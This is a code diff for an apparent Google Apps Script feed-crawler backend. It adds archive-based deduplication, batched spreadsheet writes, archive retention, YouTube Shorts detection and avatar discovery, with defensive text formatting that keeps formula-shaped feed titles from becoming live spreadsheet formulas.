+          existingUrlById[videoData[i][videoIdCol]] = String(videoData[i][urlCol0]);
         }
       }
     }
   }
 
+  // Seed the dedup sets from the Archive tab too. A slow channel's RSS window
+  // reaches past PRUNE_AFTER_DAYS, so its older items live in the archive, not
+  // the live sheet — with live-only dedup every crawl re-ingested them (paying
+  // the og:image fetch again for articles) and end-of-crawl pruning re-archived
+  // them, one duplicate Archive row per item per crawl. Only the id + url
+  // columns are read (two bounded column reads, never the whole tab). Archived
+  // ids are deliberately NOT added to existingRowById: they have no live row
+  // for the view-count/live-state refresh to write to — skipping them entirely
+  // is the point. Best-effort: a failed read falls back to live-only dedup for
+  // this crawl (the duplicate collapse in pruneOldArchive then mops up).
+  try {
+    var archiveTab = SpreadsheetApp.openById(SPREADSHEET_IDS.VIDEOS)
+      .getSheetByName(ARCHIVE_SHEET_NAME);
+    if (archiveTab && archiveTab.getLastRow() > 1) {
+      var aHeaders = archiveTab.getRange(1, 1, 1, archiveTab.getLastColumn()).getValues()[0];
+      var aIdCol = findVideoIdCol(aHeaders);
+      var aUrlCol = aHeaders.indexOf('url');
+      var aRows = archiveTab.getLastRow() - 1;
+      if (aIdCol !== -1) {
+        var aIds = archiveTab.getRange(2, aIdCol + 1, aRows, 1).getValues();
+        for (var ai = 0; ai < aIds.length; ai++) {
+          if (aIds[ai][0] !== '') existingVideos[aIds[ai][0]] = true;
+        }
+      }
+      if (aUrlCol !== -1) {
+        var aUrls = archiveTab.getRange(2, aUrlCol + 1, aRows, 1).getValues();
+        for (var au = 0; au < aUrls.length; au++) {
+          if (aUrls[au][0]) existingUrls[String(aUrls[au][0]).trim().toLowerCase()] = true;
+        }
+      }
+    }
+  } catch (archiveSeedErr) {
+    log('WARN', 'fetchAllFeeds', 'Archive dedup seed failed: ' + archiveSeedErr.message);
+  }
+
   var newCount = 0;
   var errorCount = 0;
+
+  // BE6 — batch the per-item sheet writes. New items accumulate here and are
+  // flushed in ONE setValues after the channel loop instead of an appendRow
+  // each; existing-item refreshes (view_count, the live-status trio) accumulate
+  // keyed by row and are flushed as whole-column range writes. A crawl that used
+  // to fire hundreds of write RPCs now fires a small, fixed number.
+  var pendingNewRows = [];              // rows to append in one batch
+  var pendingViewCounts = {};           // 1-based row -> fresh view_count
+  var pendingLiveState = {};            // 1-based row -> [live_status, scheduled_start, expires_at]
+  var pendingUrlFixes = {};             // 1-based row -> corrected url (watch?v= -> /shorts/)
+  var videoUrlCol = vHeaders.indexOf('url');
 
   // Resume from where the last budget-truncated crawl left off, wrapping around
   // the channel list, so a slow/dead channel near index 0 can't perpetually
@@ -683,6 +1115,10 @@ function crawlAllFeeds() {
       continue;
     }
 
+    // Single-feed crawl: skip before the fetch (and before the politeness
+    // sleep at the bottom of the loop), so the pass costs one HTTP request.
+    if (targetFeed && String(feedUrl).trim() !== targetFeed) continue;
+
     try {
       var videos = fetchAndParseFeed(feedUrl, channelName, tier, category);
 
@@ -695,6 +1131,18 @@ function crawlAllFeeds() {
         var normUrl = video.url ? String(video.url).trim().toLowerCase() : '';
         var urlKnown = normUrl !== '' && existingUrls[normUrl];
         if (!existingVideos[video.video_id] && !urlKnown) {
+          // A Data-API-sourced item carries a synthesized watch URL because
+          // playlistItems.list has no Shorts flag, and the frontend files a
+          // Short purely by its /shorts/ URL. Ask YouTube once, here, for
+          // genuinely new items only — never the whole 15-item window per
+          // crawl. An inconclusive probe keeps the watch URL; the self-heal
+          // below corrects it the next time the RSS feed is reachable.
+          if (video.short_unknown && video.media_type === 'video'
+              && probeYouTubeShort(video.video_id) === true) {
+            video.url = 'https://www.youtube.com/shorts/' + video.video_id;
+            normUrl = video.url.toLowerCase();
+          }
+
           // Post-dedup enrichment: resolve og:image ONLY now that the id/url
           // dedup has confirmed this item is genuinely new. The parsers leave
           // preview_image '' for imageless articles precisely so this page fetch
@@ -704,36 +1152,38 @@ function crawlAllFeeds() {
             video.preview_image = fetchOgImage(video.url);
           }
 
+          // vHeaders is guaranteed populated by now (an empty sheet had its
+          // canonical header written above), so every row is built from the
+          // sheet's own header order.
           var newRow = [];
-          if (vHeaders.length === 0) {
-             // Fallback if sheet is totally empty (order matches the standard schema)
-             newRow = [
-               video.video_id, video.channel_name, video.title, video.url, video.published_at, new Date().toISOString(), video.tier, video.category, 0, 0, video.media_type, video.preview_image, video.view_count || 0
-             ];
-          } else {
-            for(var h = 0; h < vHeaders.length; h++) {
-              var hName = vHeaders[h];
-              if (hName === 'video_id' || hName === 'item_id') newRow.push(video.video_id);
-              else if (hName === 'channel_name') newRow.push(video.channel_name);
-              else if (hName === 'title') newRow.push(video.title);
-              else if (hName === 'url') newRow.push(video.url);
-              else if (hName === 'published_at') newRow.push(video.published_at);
-              else if (hName === 'fetched_at') newRow.push(new Date().toISOString());
-              else if (hName === 'tier') newRow.push(video.tier);
-              else if (hName === 'category') newRow.push(video.category);
-              else if (hName === 'comment_count') newRow.push(0);
-              else if (hName === 'vote_count') newRow.push(0);
-              else if (hName === 'media_type') newRow.push(video.media_type);
-              else if (hName === 'preview_image') newRow.push(video.preview_image);
-              else if (hName === 'view_count') newRow.push(video.view_count || 0);
-              else if (hName === 'live_status') newRow.push(video.live_status || 'none');
-              else if (hName === 'scheduled_start') newRow.push(video.scheduled_start || '');
-              else if (hName === 'expires_at') newRow.push(video.expires_at || '');
-              else newRow.push('');
-            }
+          for(var h = 0; h < vHeaders.length; h++) {
+            var hName = vHeaders[h];
+            if (hName === 'video_id' || hName === 'item_id') newRow.push(video.video_id);
+            else if (hName === 'channel_name') newRow.push(video.channel_name);
+            else if (hName === 'title') newRow.push(video.title);
+            else if (hName === 'url') newRow.push(video.url);
+            else if (hName === 'published_at') newRow.push(video.published_at);
+            else if (hName === 'fetched_at') newRow.push(new Date().toISOString());
+            else if (hName === 'tier') newRow.push(video.tier);
+            else if (hName === 'category') newRow.push(video.category);
+            else if (hName === 'comment_count') newRow.push(0);
+            else if (hName === 'vote_count') newRow.push(0);
+            else if (hName === 'media_type') newRow.push(video.media_type);
+            else if (hName === 'preview_image') newRow.push(video.preview_image);
+            else if (hName === 'view_count') newRow.push(video.view_count || 0);
+            else if (hName === 'live_status') newRow.push(video.live_status || 'none');
+            else if (hName === 'scheduled_start') newRow.push(video.scheduled_start || '');
+            else if (hName === 'expires_at') newRow.push(video.expires_at || '');
+            else newRow.push('');
           }
 
-          videosSheet.appendRow(newRow);
+          // Accumulate for the single batched append after the loop (BE6). The
+          // '@' text format that defeats formula injection is applied to the
+          // whole batched range at flush time (see below) — a hostile feed's
+          // '=HYPERLINK(...)'/'=IMPORTXML(...)' title must never land as a live
+          // formula. Dedup bookkeeping happens now (not at flush) so a duplicate
+          // id/url arriving from a later channel in this same crawl is skipped.
+          pendingNewRows.push(newRow);
           existingVideos[video.video_id] = true;
           if (normUrl !== '') existingUrls[normUrl] = true;
           newCount++;
@@ -744,27 +1194,26 @@ function crawlAllFeeds() {
             // videos still inside the channel's ~15-entry RSS window are fetched
             // and reach here, so a count stops updating once the video falls out
             // of the feed — older videos keep their last recorded count.
-            videosSheet.getRange(existingRow, viewCountCol + 1).setValue(video.view_count);
+            // Accumulate for a single whole-column write after the loop (BE6).
+            pendingViewCounts[existingRow] = video.view_count;
           }
           // Re-enrich live state in place. A premiere/stream keeps its video id
           // when it becomes a VOD, so the SAME row transitions upcoming -> live
           // -> none: this clears expires_at once it airs, making the permanent
-          // entry visible without ever creating a second row.
+          // entry visible without ever creating a second row. Accumulate for a
+          // single range write after the loop (BE6).
           if (liveStatusCol !== -1 && video.live_status !== undefined) {
-            var ls = video.live_status;
-            var ss = video.scheduled_start || '';
-            var ex = video.expires_at || '';
-            // The live-state trio is self-initialized as three adjacent columns
-            // in exactly this order, so write it in one range call instead of
-            // three round-trips. Fall back to per-cell writes on any legacy
-            // sheet where the columns aren't contiguous.
-            if (scheduledStartCol === liveStatusCol + 1 && expiresAtCol === liveStatusCol + 2) {
-              videosSheet.getRange(existingRow, liveStatusCol + 1, 1, 3).setValues([[ls, ss, ex]]);
-            } else {
-              videosSheet.getRange(existingRow, liveStatusCol + 1).setValue(ls);
-              if (scheduledStartCol !== -1) videosSheet.getRange(existingRow, scheduledStartCol + 1).setValue(ss);
-              if (expiresAtCol !== -1) videosSheet.getRange(existingRow, expiresAtCol + 1).setValue(ex);
-            }
+            pendingLiveState[existingRow] =
+              [video.live_status, video.scheduled_start || '', video.expires_at || ''];
+          }
+          // Self-heal: a Short first ingested through the Data API fallback
+          // (RSS blocked that crawl) was stored with a watch URL and so never
+          // files as a Short. When the RSS feed now says /shorts/ for the same
+          // id, upgrade the stored URL in place. Never the reverse — the Data
+          // API path emits watch URLs for everything, so a watch URL arriving
+          // for a stored Short carries no information.
+          if (videoUrlCol !== -1 && isShortsUrl(video.url) && !isShortsUrl(existingUrlById[video.video_id])) {
+            pendingUrlFixes[existingRow] = video.url;
           }
         }
       }
@@ -779,20 +1228,112 @@ function crawlAllFeeds() {
     Utilities.sleep(500);
   }
 
-  // Persist where the next crawl should resume: the first channel we didn't
-  // reach when the budget cut us off, or 0 after a completed full pass. This is
-  // normal end-of-crawl finalization (it runs whether we finished or stopped
-  // early — only a hard kill skips it, which is exactly the case the budget
-  // check exists to avoid).
-  setMeta(CRAWL_RESUME_KEY, String(nextResumeIndex));
+  // ---- BE6 batched flush ----------------------------------------------------
+  // Everything the loop accumulated is written here in a handful of range calls
+  // instead of one RPC per item. Runs on both the full-pass and budget-stopped
+  // paths (the loop `break` above falls through to here).
 
-  // Update last_fetch timestamp
-  setMeta('last_fetch', new Date().toISOString());
+  // New rows: one setValues for the whole batch. Text-format the range FIRST so
+  // a hostile feed's '=...' title/url is stored literally, never as a live
+  // formula (BE9). Every row in a given execution has the same width (vHeaders
+  // is fixed for the run — or the 13-col empty-sheet fallback), so a single
+  // rectangular write is safe.
+  if (pendingNewRows.length > 0) {
+    var flushStartRow = videosSheet.getLastRow() + 1;
+    var flushWidth = pendingNewRows[0].length;
+    var newRange = videosSheet.getRange(flushStartRow, 1, pendingNewRows.length, flushWidth);
+    newRange.setNumberFormat('@');
+    newRange.setValues(pendingNewRows);
+  }
 
-  // Archive videos past the retention window so the every-request scan in
-  // readAllVideos stays bounded. Runs before the cache invalidations below so
-  // the head/top-week caches repopulate against the pruned totals.
-  var archived = pruneOldVideos();
+  // Existing-item refreshes: read each affected column once over the original
+  // data rows, overlay the accumulated updates, write the column back once.
+  // Only the crawl writes these columns, so a read-modify-write can't clobber a
+  // concurrent writer. origDataRows counts the rows that existed BEFORE the
+  // append above, which is exactly the range existingRowById points into.
+  var origDataRows = videoData.length - 1;
+  if (origDataRows > 0) {
+    var vcRows = Object.keys(pendingViewCounts);
+    if (vcRows.length > 0 && viewCountCol !== -1) {
+      var vcRange = videosSheet.getRange(2, viewCountCol + 1, origDataRows, 1);
+      var vcVals = vcRange.getValues();
+      for (var vi = 0; vi < vcRows.length; vi++) {
+        var vcRow = parseInt(vcRows[vi], 10);
+        vcVals[vcRow - 2][0] = pendingViewCounts[vcRows[vi]];
+      }
+      vcRange.setValues(vcVals);
+    }
+
+    // Shorts URL self-heal: same read-overlay-write as view counts. Text-format
+    // first so the url column can never be written as a live formula (BE9).
+    var ufRows = Object.keys(pendingUrlFixes);
+    if (ufRows.length > 0 && videoUrlCol !== -1) {
+      var ufRange = videosSheet.getRange(2, videoUrlCol + 1, origDataRows, 1);
+      var ufVals = ufRange.getValues();
+      for (var ui = 0; ui < ufRows.length; ui++) {
+        var ufRow = parseInt(ufRows[ui], 10);
+        ufVals[ufRow - 2][0] = pendingUrlFixes[ufRows[ui]];
+      }
+      ufRange.setNumberFormat('@');
+      ufRange.setValues(ufVals);
+      log('INFO', 'fetchAllFeeds', 'Upgraded ' + ufRows.length + ' stored watch URL(s) to /shorts/');
+    }
+
+    var lsRows = Object.keys(pendingLiveState);
+    if (lsRows.length > 0 && liveStatusCol !== -1) {
+      if (scheduledStartCol === liveStatusCol + 1 && expiresAtCol === liveStatusCol + 2) {
+        // Contiguous live/scheduled/expires trio: one 3-column block read+write.
+        var lsRange = videosSheet.getRange(2, liveStatusCol + 1, origDataRows, 3);
+        var lsVals = lsRange.getValues();
+        for (var li = 0; li < lsRows.length; li++) {
+          var lsRow = parseInt(lsRows[li], 10);
+          lsVals[lsRow - 2] = pendingLiveState[lsRows[li]];
+        }
+        lsRange.setValues(lsVals);
+      } else {
+        // Legacy sheet with non-adjacent columns: fall back to per-cell writes.
+        for (var li2 = 0; li2 < lsRows.length; li2++) {
+          var lr = parseInt(lsRows[li2], 10);
+          var trio = pendingLiveState[lsRows[li2]];
+          videosSheet.getRange(lr, liveStatusCol + 1).setValue(trio[0]);
+          if (scheduledStartCol !== -1) videosSheet.getRange(lr, scheduledStartCol + 1).setValue(trio[1]);
+          if (expiresAtCol !== -1) videosSheet.getRange(lr, expiresAtCol + 1).setValue(trio[2]);
+        }
+      }
+    }
+  }
+  // ---- end BE6 batched flush ------------------------------------------------
+
+  // Whole-catalog bookkeeping, and therefore the full crawl's alone. A
+  // single-feed crawl visited exactly one channel: it has no opinion on where
+  // the next full pass should resume, and last_fetch — which handleFeed reads
+  // as "every feed crawled at" — is still false. Writing either from the
+  // add-channel path would make the next full crawl skip channels and suppress
+  // the staleness signal.
+  var archived = 0;
+  var retired = 0;
+  if (!targetFeed) {
+    // Persist where the next crawl should resume: the first channel we didn't
+    // reach when the budget cut us off, or 0 after a completed full pass. This
+    // is normal end-of-crawl finalization (it runs whether we finished or
+    // stopped early — only a hard kill skips it, which is exactly the case the
+    // budget check exists to avoid).
+    setMeta(CRAWL_RESUME_KEY, String(nextResumeIndex));
+
+    // Update last_fetch timestamp
+    setMeta('last_fetch', new Date().toISOString());
+
+    // Archive videos past the retention window so the every-request scan in
+    // readAllVideos stays bounded. Runs before the cache invalidations below so
+    // the head/top-week caches repopulate against the pruned totals.
+    archived = pruneOldVideos();
+
+    // Second-stage retention: drop archived rows past the hard age cap so the
+    // Archive tab itself stays bounded (pruneOldVideos only ever appends to it).
+    // Takes its own lock, like pruneOldVideos, and invalidates the archive cache
+    // when it removes anything.
+    retired = pruneOldArchive();
+  }
 
   // The crawl appended rows and refreshed view counts / live state in place —
   // the cached head and the cached top-week window no longer reflect the sheet.
@@ -800,7 +1341,8 @@ function crawlAllFeeds() {
   invalidateTopWeek();
 
   log('INFO', 'fetchAllFeeds', 'Refresh complete. New: ' + newCount + ', Errors: ' + errorCount +
-    ', Archived: ' + archived + (stoppedEarly ? ', stopped early (resume=' + nextResumeIndex + ')' : ''));
+    ', Archived: ' + archived + ', Retired: ' + retired +
+    (stoppedEarly ? ', stopped early (resume=' + nextResumeIndex + ')' : ''));
   return { new_videos: newCount, errors: errorCount, archived: archived, stopped_early: stoppedEarly };
 }
 
@@ -890,9 +1432,14 @@ function pruneOldVideos() {
         archiveSheet.getRange(1, 1, 1, headers.length).setValues([headers]);
       }
     }
-    archiveSheet
-      .getRange(archiveSheet.getLastRow() + 1, 1, archive.length, headers.length)
-      .setValues(archive);
+    var archiveAppendRange = archiveSheet
+      .getRange(archiveSheet.getLastRow() + 1, 1, archive.length, headers.length);
+    // '@' first, like the crawl's new-row flush: the live sheet stored a
+    // hostile '=...' title/url as literal text, getValues() returned it as that
+    // string, and appending it into default-format archive cells would arm it
+    // as a live formula.
+    archiveAppendRange.setNumberFormat('@');
+    archiveAppendRange.setValues(archive);
 
     // Rewrite the live sheet as header + survivors: overwrite the top rows with
     // the kept data in one call, then physically remove the surplus trailing
@@ -914,6 +1461,130 @@ function pruneOldVideos() {
     return archive.length;
   } catch (e) {
     log('ERROR', 'pruneOldVideos', e.message);
+    return 0;
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * Second-stage retention for the Archive tab. pruneOldVideos only ever APPENDS
+ * to the archive, so the tab grows unbounded; this removes rows whose
+ * published_at is older than ARCHIVE_MAX_AGE_DAYS, keeping the tab (and its
+ * every-crawl rewrite) bounded.
+ *
+ * It ALSO collapses duplicate rows for the same item down to one. Before the
+ * crawl seeded its dedup sets from the archive, every crawl re-ingested the
+ * items a slow channel's >60-day RSS window kept serving and re-archived them —
+ * ~9x row duplication in production. The collapse keys rows exactly the way
+ * dedupeByUrl keys served items (url, falling back to id) and keeps the
+ * most-engaged copy (votes, then comments — the same copy the read path already
+ * serves), so shrinking the tab never changes what the API returns. Folding
+ * this into the retention pass makes the tab self-healing: the read+rewrite it
+ * costs is the read+rewrite this function already does every crawl.
+ *
+ * Runs after pruneOldVideos and takes the script lock itself, the same
+ * discipline pruneOldVideos uses, so it can't race a concurrent writer touching
+ * the same spreadsheet. Rewrites the Archive tab as header + survivors in one
+ * pass, then trims the surplus trailing rows — mirroring pruneOldVideos' live
+ * rewrite. A row with a missing/unparseable published_at can't be aged, so it's
+ * kept (matching pruneOldVideos). On any removal it invalidates the archive
+ * cache (which bumps the generation), so every cached page/full-list payload
+ * stamped before the removal becomes a miss rather than serving dropped rows.
+ *
+ * @returns {number} count of removed rows (retired by age + collapsed duplicates)
+ */
+function pruneOldArchive() {
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return 0; // busy — the next crawl reattempts
+  }
+  try {
+    var ss = SpreadsheetApp.openById(SPREADSHEET_IDS.VIDEOS);
+    var sheet = ss.getSheetByName(ARCHIVE_SHEET_NAME);
+    if (!sheet) return 0; // never pruned yet — no archive to retire from
+    var data = sheet.getDataRange().getValues();
+    if (data.length <= 1) return 0;
+
+    var headers = data[0];
+    var pubCol = headers.indexOf('published_at');
+    if (pubCol === -1) return 0; // can't age rows without a publish time
+    var idCol = findVideoIdCol(headers);
+    var urlCol = headers.indexOf('url');
+    var voteCol = headers.indexOf('vote_count');
+    var commentCol = headers.indexOf('comment_count');
+
+    var cutoff = Date.now() - ARCHIVE_MAX_AGE_DAYS * 24 * 60 * 60 * 1000;
+
+    // row[-1] is undefined and videoEngagement coerces it to 0, so absent
+    // vote/comment columns simply score every copy equal (first one kept).
+    var engagementOf = function(row) {
+      return videoEngagement({ vote_count: row[voteCol], comment_count: row[commentCol] });
+    };
+
+    var keep = [];
+    var retired = 0;
+    var collapsed = 0;
+    // key -> index in keep[], so a later, more-engaged copy replaces in place
+    // (keeping first-seen order, like dedupeByUrl). Null prototype: a url/id of
+    // '__proto__' or 'constructor' must be a plain key, never an inherited
+    // member or a prototype mutation (same hazard handleCommentsBatch guards).
+    var keptIndex = Object.create(null);
+    for (var i = 1; i < data.length; i++) {
+      var row = data[i];
+      var t = new Date(row[pubCol]).getTime();
+      // Undateable rows can't be aged out — keep them, mirroring pruneOldVideos.
+      if (!isNaN(t) && t < cutoff) { retired++; continue; }
+
+      var rawUrl = urlCol === -1 ? '' : row[urlCol];
+      var rawId = idCol === -1 ? '' : row[idCol];
+      var key = rawUrl ? String(rawUrl).trim().toLowerCase() : (rawId ? 'id:' + rawId : null);
+      // A row with neither url nor id can't be safely keyed — keep it rather
+      // than merge unrelated rows under one bucket.
+      if (key === null) { keep.push(row); continue; }
+
+      if (keptIndex[key] === undefined) {
+        keptIndex[key] = keep.length;
+        keep.push(row);
+      } else {
+        collapsed++;
+        if (engagementOf(row) > engagementOf(keep[keptIndex[key]])) {
+          keep[keptIndex[key]] = row;
+        }
+      }
+    }
+
+    var removed = retired + collapsed;
+    if (removed === 0) return 0;
+
+    // Rewrite as header + survivors: overwrite the top rows in one call, then
+    // physically remove the surplus trailing rows the survivors no longer fill.
+    var origDataRows = data.length - 1;
+    if (keep.length > 0) {
+      var keepRange = sheet.getRange(2, 1, keep.length, headers.length);
+      // '@' before the values land: getValues() hands back a formula-shaped
+      // title/url as a literal string, and rewriting it into a default-format
+      // cell would install it as a LIVE formula (same guard as the crawl flush).
+      keepRange.setNumberFormat('@');
+      keepRange.setValues(keep);
+    }
+    var surplus = origDataRows - keep.length;
+    if (surplus > 0) {
+      sheet.deleteRows(keep.length + 2, surplus);
+    }
+
+    // Rows left the archive — bump the generation so every cached archive page
+    // (and the full-list snapshot) stamped before this read is now a miss.
+    invalidateArchive();
+
+    log('INFO', 'pruneOldArchive', 'Removed ' + removed + ' archived rows (' +
+      retired + ' past ' + ARCHIVE_MAX_AGE_DAYS + 'd, ' + collapsed +
+      ' duplicates); ' + keep.length + ' remain');
+    return removed;
+  } catch (e) {
+    log('ERROR', 'pruneOldArchive', e.message);
     return 0;
   } finally {
     lock.releaseLock();
@@ -1011,7 +1682,10 @@ function extractFeedChannelId(feedUrl) {
  *
  * Produces the same item objects as parseAtom so the rest of crawlAllFeeds is
  * unchanged; view_count is left 0 here and recovered by enrichLiveMetadata
- * (which the crawl already runs on every batch).
+ * (which the crawl already runs on every batch). Unlike the RSS feed, the
+ * playlist carries no Shorts signal, so every item gets a watch URL plus a
+ * short_unknown flag; crawlAllFeeds probes genuinely new ones (see
+ * probeYouTubeShort) and the self-heal corrects the rest on a later RSS crawl.
  *
  * @param {string} channelId - 'UC…' channel id.
  * @param {string} channelName
@@ -1099,7 +1773,10 @@ function parseYouTubeUploads(jsonText, channelName, tier, category) {
       media_type: 'video',
       channel_name: channelName,
       title: title,
+      // Provisional: the playlist can't tell a Short from a long-form upload.
+      // short_unknown asks crawlAllFeeds to probe before persisting a new row.
       url: 'https://www.youtube.com/watch?v=' + videoId,
+      short_unknown: true,
       preview_image: thumb.url || ('https://i.ytimg.com/vi/' + videoId + '/hqdefault.jpg'),
       published_at: toIsoDate(published),
       tier: tier,
@@ -1109,6 +1786,54 @@ function parseYouTubeUploads(jsonText, channelName, tier, category) {
   }
 
   return videos;
+}
+
+/** True when a feed/stored URL is YouTube's Shorts form — the frontend's own test. */
+function isShortsUrl(url) {
+  return typeof url === 'string' && url.indexOf('/shorts/') !== -1;
+}
+
+/**
+ * Asks YouTube whether a video is a Short. The Data API exposes no such flag,
+ * but youtube.com/shorts/<id> answers 200 for a real Short and 303s to
+ * /watch?v=<id> for anything else (Apps Script's user agent first gets a 302
+ * to m.youtube.com, which then answers the same way; an unknown id is a 404).
+ * Redirects are walked manually, one hop at a time, so the Location header is
+ * what decides and the fetch can never be steered off youtube.com.
+ *
+ * Costs one or two UrlFetchApp calls. The caller runs it only for genuinely
+ * new Data-API items, never for the whole upload window on every crawl.
+ *
+ * @param {string} videoId - 11-char YouTube id.
+ * @returns {boolean|null} true = Short, false = not a Short, null = unknown
+ *   (404, 5xx, unexpected redirect, network error) — caller leaves the URL alone.
+ */
+function probeYouTubeShort(videoId) {
+  if (!/^[\w-]{11}$/.test(String(videoId || ''))) return null;
+  var url = 'https://www.youtube.com/shorts/' + videoId;
+  var maxHops = 3;
+  try {
+    for (var hop = 0; hop <= maxHops; hop++) {
+      var response = UrlFetchApp.fetch(url, { muteHttpExceptions: true, followRedirects: false });
+      var code = response.getResponseCode();
+      if (code === 200) return true;
+      if (code < 300 || code >= 400) return null;
+
+      var headers = response.getAllHeaders() || {};
+      var location = headers['Location'] || headers['location'] || '';
+      if (Array.isArray(location)) location = location[0] || '';
+      if (location.charAt(0) === '/' && location.charAt(1) !== '/') {
+        location = url.match(/^https:\/\/[^/?#]+/i)[0] + location;
+      }
+      if (!/^https:\/\/(www\.|m\.)?youtube\.com\//i.test(location)) return null;
+      if (/\/watch(\?|$)/.test(location)) return false;
+      if (!isShortsUrl(location)) return null;
+      url = location;
+    }
+  } catch (e) {
+    log('WARN', 'probeYouTubeShort', videoId + ': ' + e.message);
+  }
+  return null;
 }
 
 function extractYouTubeId(url) {
@@ -1374,13 +2099,17 @@ var CHANNEL_FETCH_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53
 
 /**
  * Editor-run entry point. Scans the CHANNELS sheet and, for every row that has
- * a `url` but is still missing derivable metadata, fetches the page and fills
- * the blanks in place:
+ * a `url` (or, failing that, a `feed_url`) but is still missing derivable
+ * metadata, fetches the page and fills the blanks in place:
  *   - YouTube channel URLs (/@handle, /channel/UC…, /c/…, /user/…, or the RSS
- *     feed URL itself) → channel_id, feed_url, channel_name, avatar.
+ *     feed URL itself) → channel_id, feed_url, channel_name, avatar, and the
+ *     canonical /channel/UC… url for url-less rows.
  *   - News / blog / any RSS site → feed_url (discovered <link rel=alternate> or
- *     a probed common feed path) and channel_name. The avatar is left blank;
- *     handleGetChannels renders the site favicon at read time.
+ *     a probed common feed path), channel_name, the site url (from the feed's
+ *     channel-level <link>, for url-less rows), and an avatar: the site's
+ *     apple-touch-icon, falling back to the feed's own <image>/<logo>. When
+ *     neither exists the avatar stays blank and handleGetChannels renders the
+ *     site favicon at read time.
  * A blank `enabled` is defaulted to TRUE once the row has a feed, so a freshly
  * added channel is actually crawled and shown. Existing non-blank cells are
  * NEVER overwritten, so this is safe to re-run and won't clobber curated
@@ -1422,7 +2151,10 @@ function enrichChannels() {
 
   for (var i = 1; i < data.length; i++) {
     var row = data[i];
-    var rawUrl = row[urlCol];
+    // Resolve from the public url, or from feed_url when url is blank (rows
+    // where the operator filled feed_url by hand) — the resolver can then fill
+    // the url column back from the feed's own channel-level <link>.
+    var rawUrl = !isBlankCell(row[urlCol]) ? row[urlCol] : row[feedCol];
     if (isBlankCell(rawUrl)) continue;
     var url = String(rawUrl).trim();
 
@@ -1431,7 +2163,8 @@ function enrichChannels() {
 
     // A network resolve is only worth it when something it can supply is blank.
     var needResolve = isBlankCell(row[nameCol]) || isBlankCell(row[feedCol]) ||
-      (isYt && (isBlankCell(row[idCol]) || isBlankCell(row[avatarCol])));
+      isBlankCell(row[urlCol]) || isBlankCell(row[avatarCol]) ||
+      (isYt && isBlankCell(row[idCol]));
     var needEnable = isBlankCell(row[enabledCol]);
     if (!needResolve && !needEnable) continue;
 
@@ -1445,6 +2178,7 @@ function enrichChannels() {
       rowFilled += fillIfBlank_(sheet, sheetRow, row, feedCol,   info.feed_url);
       rowFilled += fillIfBlank_(sheet, sheetRow, row, idCol,     info.channel_id);
       rowFilled += fillIfBlank_(sheet, sheetRow, row, avatarCol, info.avatar);
+      rowFilled += fillIfBlank_(sheet, sheetRow, row, urlCol,    info.url);
     }
     // Enable only once the row actually has a feed to crawl — enabling a row
     // with no feed_url would just log a warning every crawl.
@@ -1506,7 +2240,8 @@ function ensureChannelColumn(sheet, headers, name) {
  *
  * @param {string} url
  * @returns {{ok:boolean, media_type?:string, channel_name?:string,
- *   channel_id?:string, feed_url?:string, avatar?:string, error?:string}}
+ *   channel_id?:string, feed_url?:string, avatar?:string, url?:string,
+ *   error?:string}}
  */
 function resolveChannelFromUrl(url) {
   var clean = normalizeChannelUrl(url);
@@ -1562,7 +2297,10 @@ function resolveYouTubeChannel(url) {
     channel_id: channelId,
     feed_url: 'https://www.youtube.com/feeds/videos.xml?channel_id=' + channelId,
     channel_name: name,
-    avatar: avatar
+    avatar: avatar,
+    // Canonical channel URL, so a row onboarded from a pasted feed URL still
+    // gets a public url (platform badge + card link depend on it).
+    url: 'https://www.youtube.com/channel/' + channelId
   };
 }
 
@@ -1581,13 +2319,31 @@ function extractYouTubeChannelId(html) {
 }
 
 /**
- * Resolves a news/blog/generic site URL to an RSS/Atom feed and a display name.
- * First reads the homepage's declared feed <link>; if none is declared, probes
- * a short list of conventional feed paths. Avatar is intentionally left blank —
- * handleGetChannels renders the favicon for feed-only channels.
+ * Resolves a news/blog/generic site URL to an RSS/Atom feed, a display name,
+ * and an avatar. First reads the homepage's declared feed <link>; if none is
+ * declared, probes a short list of conventional feed paths. The avatar chain:
+ * the site's apple-touch-icon (large, square, designed for exactly this),
+ * falling back to the feed's own channel-level <image>/<logo>, falling back to
+ * blank — handleGetChannels then renders the favicon at read time.
  */
 function resolveSiteFeed(url) {
   var html = fetchHtmlSafely(url);
+
+  // The pasted URL may already BE the feed (e.g. …/articles/rss.xml). Recognize
+  // that directly: scraping a feed body for a rel=alternate <link> tag finds
+  // nothing, and the origin-path probe below can 404 its way to a false
+  // "no feed found" even though the answer was in our hands the whole time.
+  if (html && bodyLooksLikeFeed(html)) {
+    // The feed's channel-level <link> names the site homepage — that gives the
+    // row a public url AND a page to scrape an apple-touch-icon from.
+    var siteUrl = extractFeedSiteLink(html);
+    var siteHtml = siteUrl ? fetchHtmlSafely(siteUrl) : '';
+    var feedAvatar = (siteHtml ? discoverAppleTouchIcon(siteHtml, siteUrl) : '') ||
+      extractFeedImage(html);
+    return { ok: true, media_type: 'article', channel_id: '', avatar: feedAvatar,
+      feed_url: url, url: siteUrl, channel_name: cleanChannelTitle(extractFeedTitle(html)) };
+  }
+
   var name = '';
   var feedUrl = '';
   if (html) {
@@ -1604,8 +2360,67 @@ function resolveSiteFeed(url) {
       error: 'No RSS/Atom feed found for ' + url +
              ' — locate the site’s feed URL and paste it into feed_url manually' };
   }
-  return { ok: true, media_type: 'article', channel_id: '', avatar: '',
+
+  var avatar = (html ? discoverAppleTouchIcon(html, url) : '') ||
+    extractFeedImage(fetchHtmlSafely(feedUrl));
+  return { ok: true, media_type: 'article', channel_id: '', avatar: avatar,
     feed_url: feedUrl, channel_name: name };
+}
+
+/**
+ * Finds the site's apple-touch-icon in page HTML: <link rel="apple-touch-icon"
+ * (or -precomposed)>, largest declared `sizes` first. Publishers ship these for
+ * iOS home screens, so they're big (typically 180×180), square, and look right
+ * in the Channels tab's circular figure — unlike a 16px favicon.
+ */
+function discoverAppleTouchIcon(html, baseUrl) {
+  var linkRe = /<link\b[^>]*>/gi;
+  var best = '', bestSize = -1;
+  var tag;
+  while ((tag = linkRe.exec(html)) !== null) {
+    var t = tag[0];
+    var rel = (t.match(/rel=["']([^"']+)["']/i) || [])[1] || '';
+    if (!/(^|\s)apple-touch-icon(-precomposed)?(\s|$)/i.test(rel)) continue;
+    var href = (t.match(/href=["']([^"']+)["']/i) || [])[1];
+    if (!href) continue;
